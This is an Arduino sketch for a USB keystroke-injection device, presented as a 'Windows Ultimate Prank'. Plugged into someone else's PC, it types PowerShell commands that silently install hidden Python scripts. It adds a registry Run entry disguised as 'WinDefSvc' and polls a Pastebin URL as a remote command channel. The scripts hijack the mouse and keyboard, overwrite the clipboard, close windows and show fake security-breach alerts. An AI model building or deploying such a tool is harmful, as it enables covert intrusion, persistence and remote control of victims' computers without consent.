#include <Keyboard.h>

// Arduino Pro Micro / Leonardo — Windows Ultimate Prank
// !! Replace XXXXXXXX in this file with your own Pastebin raw ID before flashing !!
// See README.md for how to create your Pastebin.
//
// HOW IT WORKS:
//   1. Plug in — all 12 prank scripts are silently installed. Nothing happens yet.
//   2. Arduino is removed. Target has no idea.
//   3. Put a command in your Pastebin to trigger a prank remotely.
//
// PASTEBIN COMMAND FORMAT:
//   COMMAND          — uses default interval
//   COMMAND seconds  — runs every N seconds e.g. "MINIMISE 60"
//
// COMMANDS: ACTIVATE JIGGLE MINIMISE SOUND NOTIFY CLIPBOARD ZOOM
//           CAPS VOLUME CLOSE SPEECH DARK SCROLL STOP
//
// No pip installs. Uses only: ctypes, winsound, winreg, subprocess (all built-in).

void typeln(const char* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(150);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  // Win+R → PowerShell
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2500);

  typeln("$d=$env:APPDATA");

  // === 1. JIGGLE — Mouse teleporter (.j.py) — default 60s ===
  typeln("$f=\"$d\\.j.py\"");
  typeln("'import sys,ctypes,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 60' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' ctypes.windll.user32.SetCursorPos(random.randint(0,3840),random.randint(0,2160))' | ac $f");

  // === 2. MINIMISE — Win+M (.w.py) — default 180s ===
  typeln("$f=\"$d\\.w.py\"");
  typeln("'import sys,ctypes,time' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 180' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x5B,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x4D,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x4D,0,2,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x5B,0,2,0)' | ac $f");

  // === 3. SOUND — Random Windows beep (.s.py) — default 60s ===
  typeln("$f=\"$d\\.s.py\"");
  typeln("'import sys,winsound,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 60' | ac $f");
  typeln("'b=[0,16,32,48,64]' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' winsound.MessageBeep(random.choice(b))' | ac $f");

  // === 4. NOTIFY — Fake critical error popup (.n.py) — default 180s ===
  typeln("$f=\"$d\\.n.py\"");
  typeln("'import sys,subprocess,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 180' | ac $f");
  typeln("'t=[''Critical Error'',''Security Warning'',''System Failure'',''Disk Error'',''Memory Fault'',''Network Breach'']' | ac $f");
  typeln("'m=[''A critical system error has occurred'',''Suspicious activity detected on this PC'',''Windows has stopped working correctly'',''Hard drive read error. Backup data immediately'',''RAM allocation failure. Restart required'',''Unauthorised remote access attempt blocked'']' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' i=random.randint(0,5)' | ac $f");
  typeln("' subprocess.Popen([''mshta'',''javascript:new ActiveXObject(\"WScript.Shell\").Popup(\\''+m[i]+'\\',5,\\''+t[i]+'\\',16);close()''])' | ac $f");

  // === 5. CLIPBOARD — Replace clipboard (.c.py) — default 45s ===
  typeln("$f=\"$d\\.c.py\"");
  typeln("'import sys,subprocess,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 45' | ac $f");
  typeln("'m=[''what did you copy'',''nice try'',''I already read that'',''that belongs to me now'',''clipboard accessed'',''did you mean to copy that'']' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' subprocess.run([''powershell'',''-c'',''Set-Clipboard \"''+random.choice(m)+''\"''])' | ac $f");

  // === 6. ZOOM — Ctrl+= (.z.py) — default 90s ===
  typeln("$f=\"$d\\.z.py\"");
  typeln("'import sys,ctypes,time' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 90' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x11,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0xBB,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0xBB,0,2,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x11,0,2,0)' | ac $f");

  // === 7. CAPS — Toggle caps lock (.k.py) — default 60s ===
  typeln("$f=\"$d\\.k.py\"");
  typeln("'import sys,ctypes,time' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 60' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x14,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x14,0,2,0)' | ac $f");

  // === 8. VOLUME — Spike or drop volume (.v.py) — default 60s ===
  typeln("$f=\"$d\\.v.py\"");
  typeln("'import sys,ctypes,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 60' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' k=random.choice([0xAE,0xAF])' | ac $f");
  typeln("' n=random.randint(5,15)' | ac $f");
  typeln("' for _ in range(n):' | ac $f");
  typeln("'  ctypes.windll.user32.keybd_event(k,0,0,0)' | ac $f");
  typeln("'  ctypes.windll.user32.keybd_event(k,0,2,0)' | ac $f");

  // === 9. CLOSE — Alt+F4 (.x.py) — default 240s ===
  typeln("$f=\"$d\\.x.py\"");
  typeln("'import sys,ctypes,time' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 240' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x12,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x73,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x73,0,2,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x12,0,2,0)' | ac $f");

  // === 10. SPEECH — SAPI voice (.p.py) — default 120s ===
  typeln("$f=\"$d\\.p.py\"");
  typeln("'import sys,subprocess,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 120' | ac $f");
  typeln("'m=[''Hi'',''Message from PC'',''Hi there'',''Hello'',''Can you hear me'',''I am your computer'']' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' subprocess.Popen([''mshta'',''vbscript:CreateObject(\\x22SAPI.SpVoice\\x22).Speak(\\x22''+random.choice(m)+''\\x22)(window.close)''])' | ac $f");

  // === 11. DARK — Flip dark/light mode (.d.py) — default 300s ===
  typeln("$f=\"$d\\.d.py\"");
  typeln("'import sys,winreg,time' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 300' | ac $f");
  typeln("'K=r''Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize''' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' try:' | ac $f");
  typeln("'  h=winreg.OpenKey(winreg.HKEY_CURRENT_USER,K,0,winreg.KEY_ALL_ACCESS)' | ac $f");
  typeln("'  v,_=winreg.QueryValueEx(h,''AppsUseLightTheme'')' | ac $f");
  typeln("'  winreg.SetValueEx(h,''AppsUseLightTheme'',0,winreg.REG_DWORD,1-v)' | ac $f");
  typeln("'  winreg.CloseKey(h)' | ac $f");
  typeln("' except:pass' | ac $f");

  // === 12. SCROLL — Random scroll jump (.r.py) — default 45s ===
  typeln("$f=\"$d\\.r.py\"");
  typeln("'import sys,ctypes,time,random' | sc $f");
  typeln("'N=int(sys.argv[1]) if len(sys.argv)>1 else 45' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(N)' | ac $f");
  typeln("' ctypes.windll.user32.mouse_event(0x800,0,0,random.choice([-600,600]),0)' | ac $f");

  // === Pastebin trigger + Registry persistence (.t.py) ===
  // Polls Pastebin every 5 min. Parses "COMMAND" or "COMMAND seconds".
  // Passes interval as argv[1] to the launched prank script.
  typeln("$f=\"$d\\.t.py\"");
  typeln("'import subprocess,time,urllib.request,os,winreg' | sc $f");
  typeln("'p=os.path.join(os.environ[''APPDATA''],''.t.py'')' | ac $f");
  typeln("'try:' | ac $f");
  typeln("' k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r''Software\\Microsoft\\Windows\\CurrentVersion\\Run'',0,winreg.KEY_SET_VALUE)' | ac $f");
  typeln("' winreg.SetValueEx(k,''WinDefSvc'',0,winreg.REG_SZ,''pythonw ''+p)' | ac $f");
  typeln("' winreg.CloseKey(k)' | ac $f");
  typeln("'except:pass' | ac $f");
  typeln("'d=os.environ[''APPDATA'']' | ac $f");
  typeln("'fs=[os.path.join(d,x) for x in [''.j.py'',''.w.py'',''.s.py'',''.n.py'',''.c.py'',''.z.py'',''.k.py'',''.v.py'',''.x.py'',''.p.py'',''.d.py'',''.r.py'']]' | ac $f");
  typeln("'URL=''https://pastebin.com/raw/XXXXXXXX''' | ac $f"); // <-- replace XXXXXXXX with your Pastebin ID
  typeln("'def g():' | ac $f");
  typeln("' try:return urllib.request.urlopen(URL,timeout=5).read().decode().strip()' | ac $f");
  typeln("' except:return \"\"' | ac $f");
  typeln("'while True:' | ac $f");
  typeln("' t=g()' | ac $f");
  typeln("' parts=t.split()' | ac $f");
  typeln("' cmd=parts[0] if parts else \"\"' | ac $f");
  typeln("' iv=parts[1:2]' | ac $f");
  typeln("' if cmd==\"STOP\":' | ac $f");
  typeln("'  try:' | ac $f");
  typeln("'   k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r''Software\\Microsoft\\Windows\\CurrentVersion\\Run'',0,winreg.KEY_SET_VALUE)' | ac $f");
  typeln("'   winreg.DeleteValue(k,''WinDefSvc'')' | ac $f");
  typeln("'   winreg.CloseKey(k)' | ac $f");
  typeln("'  except:pass' | ac $f");
  typeln("'  subprocess.run([''taskkill'',''/f'',''/im'',''pythonw.exe''],capture_output=1)' | ac $f");
  typeln("'  [os.remove(f) for f in fs if os.path.exists(f)]' | ac $f");
  typeln("'  break' | ac $f");
  typeln("' if cmd==\"ACTIVATE\":' | ac $f");
  typeln("'  for f in fs:subprocess.Popen([\"pythonw\",f]+iv)' | ac $f");
  typeln("'  break' | ac $f");
  typeln("' if cmd==\"JIGGLE\":subprocess.Popen([\"pythonw\",fs[0]]+iv);break' | ac $f");
  typeln("' if cmd==\"MINIMISE\":subprocess.Popen([\"pythonw\",fs[1]]+iv);break' | ac $f");
  typeln("' if cmd==\"SOUND\":subprocess.Popen([\"pythonw\",fs[2]]+iv);break' | ac $f");
  typeln("' if cmd==\"NOTIFY\":subprocess.Popen([\"pythonw\",fs[3]]+iv);break' | ac $f");
  typeln("' if cmd==\"CLIPBOARD\":subprocess.Popen([\"pythonw\",fs[4]]+iv);break' | ac $f");
  typeln("' if cmd==\"ZOOM\":subprocess.Popen([\"pythonw\",fs[5]]+iv);break' | ac $f");
  typeln("' if cmd==\"CAPS\":subprocess.Popen([\"pythonw\",fs[6]]+iv);break' | ac $f");
  typeln("' if cmd==\"VOLUME\":subprocess.Popen([\"pythonw\",fs[7]]+iv);break' | ac $f");
  typeln("' if cmd==\"CLOSE\":subprocess.Popen([\"pythonw\",fs[8]]+iv);break' | ac $f");
  typeln("' if cmd==\"SPEECH\":subprocess.Popen([\"pythonw\",fs[9]]+iv);break' | ac $f");
  typeln("' if cmd==\"DARK\":subprocess.Popen([\"pythonw\",fs[10]]+iv);break' | ac $f");
  typeln("' if cmd==\"SCROLL\":subprocess.Popen([\"pythonw\",fs[11]]+iv);break' | ac $f");
  typeln("' time.sleep(300)' | ac $f");

  // Launch trigger silently. Nothing visible happens. Close PowerShell.
  typeln("Start-Process pythonw \"$d\\.t.py\" -WindowStyle Hidden");
  typeln("exit");
}
void loop() {}
